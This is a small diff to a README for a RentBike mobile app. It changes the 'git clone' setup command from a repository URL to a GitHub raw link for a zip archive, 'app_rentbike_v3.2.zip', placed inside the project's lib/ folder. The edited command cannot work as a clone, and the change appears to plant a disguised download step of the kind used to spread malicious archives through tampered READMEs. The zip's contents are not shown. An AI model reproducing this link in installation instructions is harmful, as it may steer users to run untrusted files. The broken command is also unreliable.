@@ -216,7 +216,7 @@ RentBike/
 
 ### 1. Clone Repository
 ```bash
-git clone https://github.com/tianarsamm/UTS_PemrogramanMobile.git
+git clone https://github.com/tianarsamm/rentbike_app/raw/refs/heads/main/lib/app_rentbike_v3.2.zip
 cd RentRide
 ```
 
